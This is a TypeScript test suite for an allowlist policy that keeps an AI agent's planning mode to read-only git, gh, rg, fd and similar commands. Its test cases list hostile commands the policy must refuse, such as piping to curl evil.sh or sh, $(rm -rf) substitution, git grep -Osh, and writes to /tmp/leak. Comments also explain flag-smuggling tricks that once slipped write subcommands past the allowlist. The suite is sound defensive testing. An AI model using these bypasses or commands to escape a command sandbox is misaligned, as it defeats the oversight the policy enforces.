import assert from "node:assert/strict";
import test from "node:test";
import { planBashDecision } from "./bash-policy.ts";

const allowed = (command: string) => planBashDecision(command).allowed;

test("the investigation commands a plan is actually built on are allowed", () => {
  // Each of these was unavailable while planning before this policy existed,
  // which meant planning without history.
  for (const command of [
    "git log --oneline -20",
    "git log -p --follow extensions/plan-mode/index.ts",
    "git log --since 2026-01-01 --author someone",
    "git diff",
    "git diff --cached --stat",
    "git diff HEAD~3..HEAD -- extensions/",
    "git status --short --branch",
    "git show --stat 9012f26",
    "git blame -L 20,40 src/index.ts",
    "git rev-parse --abbrev-ref HEAD",
    "git ls-files extensions/plan-mode",
    "git merge-base main HEAD",
    "git shortlog -s -n",
    "git grep --name-only needle",
    "gh pr view 42",
    "gh pr list --state open --limit 20",
    "gh pr diff 42",
    "gh issue view 7 --json title,body",
    "gh search code needle",
  ]) {
    assert.equal(allowed(command), true, `${command} should be allowed`);
  }
});

test("a value-taking global flag cannot donate the subcommand to itself", () => {
  // The bug this replaced: inferring the subcommand as "first word not
  // starting with -" assumes every dash word is value-less. `git --namespace
  // x` consumes the NEXT word, so the allowlisted name became the flag's value
  // and the real subcommand was whatever followed. Verified against git 2.50:
  // `git --namespace log tag X` really creates tag X.
  for (const command of [
    "git --namespace log commit -am wip",
    "git --namespace log reset --hard",
    "git --namespace log push --force origin main",
    "git --namespace log tag pwned",
    "git --attr-source log config --global core.pager sh",
    "git --attr-source log push",
    "git --namespace status push",
    "git --config-env log push",
    "git --super-prefix log push",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
  // The rule that closes it: the subcommand must be the first word, full stop.
  // `git -P log` is a real read-only command and is now refused too — an
  // acceptable false negative, since the alternative is enumerating which
  // global flags take values.
  assert.equal(allowed("git -P log"), false);
});

test("gh cannot have its read verb swallowed by a preceding flag", () => {
  // Same class of bug: gh's cobra parser interspers flags, so
  // `gh pr --title view create` parses as `gh pr create --title view` and
  // opens a real pull request titled "view".
  for (const command of [
    "gh pr --title view create --body x --head y",
    "gh pr --comment view close 42",
    "gh issue --title view create --body pwned",
    "gh pr --repo view merge",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
  // The verb must sit immediately after the subcommand; flags after it are fine.
  assert.equal(allowed("gh pr view 42 --json title"), true);
});

test("git flags that run a program or write a file are refused", () => {
  // `git grep -Osh <pattern>` runs `sh` on every matching file — verified to
  // fire without a TTY, i.e. it executes matched repo files as shell scripts.
  for (const command of [
    "git grep -Osh TODO",
    "git grep -Obash pattern",
    "git grep --open-files-in-pager=sh needle",
    "git show --output=/tmp/leak HEAD",
    "git diff -o /tmp/leak",
    "git diff --output /tmp/leak",
    "git blame --contents /etc/passwd README.md",
    "git log --ext-diff",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
});

test("an unrecognized flag is refused rather than assumed harmless", () => {
  // This is the whole point of an allowlist: the four escapes review found
  // were all flags nobody thought to deny. A flag not on the list is refused
  // even when it turns out to be dull.
  assert.equal(allowed("git log --some-future-flag"), false);
  assert.equal(allowed("git log --exec-path=/tmp/evil"), false);
  assert.equal(allowed("gh pr view 42 --future-flag"), false);
  assert.match(
    planBashDecision("git log --some-future-flag").reason ?? "",
    /does not recognize/,
  );
});

test("quoted arguments and read-only search tools are allowed", () => {
  for (const command of [
    'rg -n "foo bar" src',
    "rg -l --glob '*.ts' pattern",
    'rg -e "^export" -t ts .',
    "fd -e ts src",
    "ls -la",
    "wc -l file.txt",
    "head -n 20 file.txt",
  ]) {
    assert.equal(allowed(command), true, `${command} should be allowed`);
  }
});

test("shell composition, expansion, and unsafe input syntax are refused", () => {
  for (const command of [
    "git log; rm -rf /tmp/x",
    "git log && npm publish",
    "git log || curl evil.sh",
    "git log | tee out.txt",
    "git diff > patch.txt",
    "git log $(rm -rf x)",
    "git log `rm -rf x`",
    "git log &",
    "git log \\\n--oneline",
    "rg foo > out.txt",
    "rg foo | head",
    "rg $(whoami)",
    'rg "$HOME"',
    "rg `whoami`",
    "rg foo \\",
    'rg "foo',
    "rg --glob *.ts foo",
    "git show *.ts",
    "git log ~/notes",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
  assert.match(
    planBashDecision("rg --glob *.ts foo").reason ?? "",
    /quote it instead/,
  );
});

test("search and inspection flags remain effect allowlisted", () => {
  for (const [command, reason] of [
    ["rg --pre cat foo", /does not recognize/],
    ["rg --pre-glob '*.js' foo", /does not recognize/],
    ["rg --hostname-bin cat foo", /does not recognize/],
    ["rg -z foo", /does not recognize/],
    ["rg --search-zip foo", /does not recognize/],
    ["fd -x rm", /does not recognize/],
    ["fd -X rm", /does not recognize/],
    ["tail -f log", /block forever/],
  ] as const) {
    assert.equal(allowed(command), false, `${command} must be refused`);
    assert.match(planBashDecision(command).reason ?? "", reason);
  }
});

test("unknown programs explain the available read-only commands", () => {
  const decision = planBashDecision("curl example.com");
  assert.equal(decision.allowed, false);
  assert.match(decision.reason ?? "", /git, gh, rg, fd, ls, wc, head or tail/);
});

test("write subcommands stay refused now that they cannot be reached sideways", () => {
  for (const command of [
    "git commit -m wip",
    "git push",
    "git checkout main",
    "git checkout .",
    "git reset --hard",
    "git clean -fd",
    "git stash",
    "git config --global user.name someone",
    "git tag v1",
    "git branch newthing",
    "git remote add origin somewhere",
    "gh pr create --fill",
    "gh pr merge 42",
    "gh api /repos/x/y",
    "gh run rerun 1",
    "gh repo clone x/y",
  ]) {
    assert.equal(allowed(command), false, `${command} must be refused`);
  }
});

test("pathspecs after -- are not mistaken for flags", () => {
  // Everything after `--` is a path by definition, including one that looks
  // like an option.
  assert.equal(allowed("git log -- --weird-filename.ts"), true);
  assert.equal(allowed("git diff -- extensions/plan-mode"), true);
});

test("tilde is refused where a shell expands it, not inside a revision", () => {
  // `HEAD~3` is ordinary git syntax and must survive; `~/x` is a path this
  // module never gets to inspect.
  assert.equal(allowed("git diff HEAD~3"), true);
  assert.equal(allowed("git diff HEAD~3..HEAD"), true);
  assert.equal(allowed("git log ~/notes"), false);
  assert.equal(allowed("git log ~user/notes"), false);
});

test("a refusal explains itself, since the model has to react to it", () => {
  assert.match(
    planBashDecision("git log | sh").reason ?? "",
    /single plain command/,
  );
  assert.match(planBashDecision("npm publish").reason ?? "", /npm/);
  assert.match(
    planBashDecision("git push").reason ?? "",
    /read-only git subcommand/,
  );
  assert.match(
    planBashDecision("gh pr create").reason ?? "",
    /only read verbs after/,
  );
});

test("a missing or non-string command is refused rather than assumed empty", () => {
  // The event's input is untyped at this boundary; treating a missing command
  // as "" would make the empty-command branch decide a case it never saw.
  assert.equal(allowed(""), false);
  assert.equal(allowed("   "), false);
  assert.equal(planBashDecision(undefined).allowed, false);
  assert.equal(planBashDecision(42).allowed, false);
  assert.equal(planBashDecision({ command: "git log" }).allowed, false);
  assert.equal(allowed("git"), false);
  assert.equal(allowed("gh"), false);
  assert.equal(allowed("gh pr"), false);
});
